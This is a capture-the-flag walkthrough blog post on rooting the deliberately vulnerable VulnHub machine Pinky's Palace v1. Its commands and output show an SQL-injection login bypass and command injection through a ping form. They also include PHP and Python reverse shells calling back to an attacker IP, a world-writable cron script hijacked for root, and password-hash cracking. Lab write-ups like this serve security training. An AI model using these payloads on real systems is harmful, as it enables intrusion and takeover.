---
layout: post
title:  "Pinky's Palace: v1 created by Pink_P4nther"
date:   2018-03-31 12:19:21 +0700
categories: [ctf]
---

This VM is part of a series and was provided by Pink_P4nther at [pinkysplanet]. \\
Other VMs of this series can be downloaded from [VulnHub] too.\\
Go check them out - there`re awesome!

# Enumeration
As we boot the VM in `bridged mode` there is an output on the console which shows us the IP address of the VM:`192.168.0.11`. \\
First, we start with an `nmap` scan to check for any open ports.

- `-sC: equivalent to --script=default`
- `-sV: Probe open ports to determine service/version info`
- `-O: Enable OS detection`


``` text
root@kali:~# nmap -sCV -O 192.168.0.11

Starting Nmap 7.70 ( https://nmap.org ) at 2018-03-31 14:44 CEST
Nmap scan report for 192.168.0.11
Host is up (0.00022s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 7e:0e:97:38:ad:81:72:3e:97:94:b7:ad:22:fc:6a:cc (RSA)
|   256 a8:72:b6:4f:a4:a6:6c:19:dd:49:30:29:c9:8c:7a:31 (ECDSA)
|_  256 60:ac:bf:bd:fb:f7:3b:69:09:16:fa:5c:d3:cc:ba:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky's Palace
MAC Address: 08:00:27:B0:73:BB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Fantastic, we found 2 open Ports: `22/tcp ssh` and `80/tcp http`. \\
Next obvious thing is to open `192.168.0.11:80` in our browser or make a quick `curl` to check if there are any more information/hints.

```text
root@kali:~# curl 192.168.0.11

<html>
	<head>
		<title>Pinky's Palace</title>
	</head>
	<body>
		<h1>Welcome to Pinky's Palace!</h1>
		<p>We are still under development</p>

	</body>
	<style>
		html
		{
			background: #f74bff;
		}
	</style>
</html>
```

Looks like there is really nothing.
Lets enumerate with `nmap` `http-enum` script to see if there are any _hidden_ subdirectories.

``` text
root@kali:~# nmap --script=http-enum 192.168.0.11 -p 80

80/tcp open  http
| http-enum:
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
```

Visiting `/css/`,`/dev/`,`/uploads/` in browser - again nothing.
But the `/uploads/` directory looks like its meant to be vulnerable to some unauthorized upload of a `reverse shell`. Lets enumerate the `http-methods` available and hope that there is a `put` method.

``` text
root@kali:~# nmap --script=http-methods 192.168.0.11 -p 80

PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

There is none. \\
Well, I was stuck here for a quite long time and [dirbusted] the page with every word-list I could find. Eventually I decided to look it up and found a write-up from Pink_P4nther himself on [Youtube].


There is a hidden directory `/portal_login/` I was not able to find.
Unfortunately this write-up does not explain how the directory could/should be found - just that it exists - without any hint. That is pretty disappointing but lets continue. (If you have any idea, feel free so send me an email: nullorzero.sec[at]me.com)


At address `http://192.168.0.11/portal_login/` the following login screen appears:

![image-title-here](/static/img/portallogin.png){:class="img-responsive"}

If we type in random credentials we are redirected to `/login.php` with the textual output:

``` text
Incorrect Username or Password
```

This looks like a possible `SQL-injection` vulnerability. I tested some login tricks from this sql [cheat sheet] and eventually found one:

``` text
username = "user' or 1=1#"
password = "pass"
```

Typing `username` and `password` in manually and sending this `post` will redirect us to `/1337pinkyssup3rs3cr3tlair/index.html`:

![image-title-here](/static/img/ping.png){:class="img-responsive"}

Lets type in `localhost` maybe we get some useful hint/error.

``` text
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.056 ms
64 bytes from localhost (::1): icmp_seq=3 ttl=64 time=0.031 ms
64 bytes from localhost (::1): icmp_seq=4 ttl=64 time=0.030 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3051ms
rtt min/avg/max/mdev = 0.018/0.033/0.056/0.015 ms
```

We are redirected to `mau.php` and it prints a sequence of 4 subsequent pings to `localhost`. Looks like there is some `bash` involved or maybe it is just a redirect of `stdout`. Lets see if it is vulnerable to injection other commands.
What about inserting: \\
`localhost; ls -al; whoami; cat mau.php`

``` text
[...]
drwxr-xr-x 2 root root 4096 Jan 14 03:28 .
drwxr-xr-x 7 root root 4096 Jan 14 04:38 ..
-rw-r--r-- 1 root root  400 Jan 14 02:55 index.html
-rw-r--r-- 1 root root  146 Jan 14 01:41 mau.php
www-data
$output
"; } ?>
```
Seems like we were right - it is just a redirect.
Now we can inject a reverse shell from the cheat sheet from [pentestmonkeys] to gain a working shell on our attacking machine kali. Inside kali we have to use `netcat` to listen for incoming conections:
- `-n, --dont-resolve  numeric-only IP addresses, no DNS`
- `-l, --listen  listen mode, for inbound connects`
- `-v, --verbose  verbose (use twice to be more verbose)`
- `-p, --local-port=NUM  local port number`

``` text
nc -nlvp 1234
```
n
We insert the reverse shell into the ping prompt which is pointing to our attacker machine:

`localhost; php -r '$sock=fsockopen("192.168.0.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

And now we can upgrade our shell in the attacker machine which is also from [pentestmonkeys]:

``` text
Connection from 192.168.0.11:59914

$ python -c 'import pty;pty.spawn("/bin/bash");'
www-data@pinkys-palace:/var/www/html/1337pinkyssup3rs3cr3tlair$ ls -al
ls -al
total 16
drwxr-xr-x 2 root root 4096 Jan 14 03:28 .
drwxr-xr-x 7 root root 4096 Jan 14 04:38 ..
-rw-r--r-- 1 root root  400 Jan 14 02:55 index.html
-rw-r--r-- 1 root root  146 Jan 14 01:41 mau.php
www-data@pinkys-palace:/var/www/html/1337pinkyssup3rs3cr3tlair$
```
Great we have a working shell now!

# Privilege escalation USER

Lets have a look at the `home directory` of the user `pinky` so see if there is something interesting.

``` text
www-data@pinkys-palace:/var/www/html/1337pinkyssup3rs3cr3tlair$ ls -al /home/pinky/
<html/1337pinkyssup3rs3cr3tlair$ ls -al /home/pinky/
total 100
drwxr-xr-x 3 pinky pinky  4096 Mar 31 15:11 .
drwxr-xr-x 3 root  root   4096 Jan 13 21:36 ..
-rw------- 1 pinky pinky   323 Mar 31 14:24 .bash_history
-rw-r--r-- 1 pinky pinky   220 Jan 13 21:36 .bash_logout
-rw-r--r-- 1 pinky pinky  3527 Jan 14 02:30 .bashrc
-rw-r--r-- 1 pinky pinky   675 Jan 13 21:36 .profile
-rw-r--r-- 1 root  root     92 Jan 14 02:31 note.txt
www-data@pinkys-palace:/var/www/html/1337pinkyssup3rs3cr3tlair$ cat /home/pinky/note.txt
There seems to be an issue with my shell, but I havent slept for days... I'll fix it later.
```

An issue with the `shell`? I had no idea at that point how this hint could be helpful because the `shell` was working properly.
I decided to search for known files like the `/login.php` I encountered earlier.

``` text
www-data@pinkys-palace:/var/www/html$ cat /var/www/html/portal_login/login.php
[...]
$DB_USER = "pinkys_dbu";
$DB_PASS = "pinkysDBp@55";
$DB_HOST = "localhost";
$DB_NAME = "pinkdash_db";
$user = $_POST['user'];
$pass = $_POST['pass'];
$FULLQUERY = "SELECT * FROM users WHERE username='" . $user . "' AND password='" . MD5($pass) . "'";

$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS);
$db = mysqli_select_db($conn, $DB_NAME);
[...]
```
Wow we got everything. We have now a `username` and `password` and the `database-name` of their `mysql` database.
Lets test if we can `login` into `mysql` with those credentials.
- `-u, --user=name  User for login if not current user.`
- `-p, --password[=name]`

``` text
www-data@pinkys-palace:/var/www/html$ mysql -upinkys_dbu -ppinkysDBp@55

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 16
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1
Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```
Since we know the name of the `mysql database` from `/login.php` which is `pinkdash_db` we can simply look into the database by typing in `use` followed by a `sql query` to list the `users`:

``` text
MariaDB [(none)]> use pinkdash_db

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed

MariaDB [pinkdash_db]> select * from users;

+------+----------+----------------------------------+
| id   | username | password                         |
+------+----------+----------------------------------+
|    1 | pinky    | 65f7886a4b9fc1214e3c365222321f93 |
+------+----------+----------------------------------+
1 row in set (0.00 sec)
```

We found a `md5` password `hash` of the user `pinky`! \\
Lets ask`John` (the Ripper) if he knows more!

- `--format=NAME  force hash type NAME`
- `--wordlist[=FILE] --stdin  wordlist mode, read words from FILE or stdin`
- `--show[=LEFT]  show cracked passwords [if =LEFT, then uncracked]`

``` text
echo "65f7886a4b9fc1214e3c365222321f93" >> /tmp/hash.txt

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
[...]

john --show --format=raw-md5 /tmp/hash.txt
?:!!pinkbabygurl!!
```
Now we got the password and try to login via `ssh`.

``` text
root@kali:~# ssh pinky@192.168.0.11
[...]
pinky@192.168.0.11's password:
[...]
[+] 1337 5H3LL [+]

pinky@pinkys-palace:~$
```
We successfully _pwned_ the `user` `pinky`!

# Privilege escalation ROOT

Well what do we do now? We need to find a vulnerability in software or a file with wrong permission etc. to elevate our privileges to `root`. For that we use the wonderful script `LinEnum`. You can clone this from git: [rebootuser]. After cloning the repository to `/tmp/linenum` we copy the script via `scp` to the `home` directory of pinky.

``` text
root@kali:~# git clone https://github.com/rebootuser/LinEnum.git /tmp/linenum
root@kali:~# scp /tmp/linenum/LinEnum.sh pinky@192.168.0.11:/home/pinky/
pinky@192.168.0.11's password:
LinEnum.sh  100%   37KB   1.3MB/s   00:00
```

After transferring the file we execute `LinEnum.sh`. But wait... something is wrong. If we call the script by: `./LinEnum.sh` nothing happens. Seems like the `user` pinky does not execute the script at all. If we check for `env` or `python` there is nothing. Obviously the executables in `/usr/bin` are missing. But on the other hand we could call `mysql` as user `www-data`. Maybe only the reference is missing. Lets check the `PATH` variable for `/usr/bin`.

``` text
pinky@pinkys-palace:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin::/sbin:/bin
```

Well, indeed the `/usr/bin` entry is missing. We will simply add this entry and check the `PATH` again.

``` text
pinky@pinkys-palace:~$ export PATH=/usr/bin:$PATH
pinky@pinkys-palace:~$ echo $PATH
/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin::/sbin:/bin
```

Now our `LinEnum.sh` should work properly. Lets execute the script with the argument `-t`.

- `-t  Include thorough (lengthy) tests`

``` text
pinky@pinkys-palace:~$ ./LinEnum -t
[...]
World-writable files (excluding /proc):
--w--w--w- 1 root root 0 Apr  1 10:57 /sys/fs/cgroup/memory/cgroup.event_control
-rwxrwxrwx 1 root staff 346 Mar 31 15:15 /usr/local/bin/justincase.py
[...]
```

That looks promising! There is a world-writable file `justincase.py` which is owned by root. We should absolutely make use of it. Lets see if this file is somehow connected to a `cronjob` because backing up regularly right? Lets test if we can use the `cronjob` to `write` something into a file and wait a few seconds/minutes.

``` text
pinky@pinkys-palace:~$ touch /home/pinky/watch.txt
```
Put the following code into `/usr/local/bin/justincase.py` and wait for an possible `cronjob` from `root`.

{% highlight python %}
#!/usr/bin/env python

# Soon to be backup script for my palace!
with open("/home/pinky/watch.txt", "a") as myfile:
    myfile.write("test")
{% endhighlight %}

``` text
pinky@pinkys-palace:~$ cat /home/pinky/watch.txt
testtesttesttesttesttest
```

After round about 5 min of examining other regions in the `VM` I looked inside with `cat` and it turns out that there is a `cronjob` running actually. Lets exploit this to get root! All we have to do is sending a `reverse tcp shell` to our attacking machine kali. Since there is also a python version at [pentestmonkeys] we will use this. Modify the `IP` and `Port` to your desire and insert the code into `/usr/local/bin/justincase.py`. (simple echoing removes quotes so just paste it in or else have a look here: [stackoverflow])

{% highlight python %}
#!/usr/bin/env python

# Soon to be backup script for my palace!
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
{% endhighlight %}

Last thing to do is listening for an incoming connection with `netcat`.

``` text
root@kali:~# nc -nlvp 1234

Connection from 192.168.0.11:36888
/bin/sh: 0: can't access tty; job control turned off

# whoami
root

# ls
root.txt
test.txt

# cat root.txt
!!!!!CONGRATS YOU GOT ROOT!!!!!

[+] Flag: d6dc7d5b9f99559fc6c91872bc7020af

```
Calling `whoami`. We are `ROOT`!



[VulnHub]: https://www.vulnhub.com/entry/pinkys-palace-v1,225/
[Youtube]: https://www.youtube.com/watch?v=EEgpHGe7euU
[cheat sheet]: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
[pentestmonkeys]: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[dirbusted]: https://tools.kali.org/web-applications/dirbuster
[rebootuser]: https://github.com/rebootuser/LinEnum.git
[stackoverflow]: https://stackoverflow.com/questions/18929149/print-double-quotes-in-shell-programming
[pinkysplanet]: https://pinkysplanet.net/
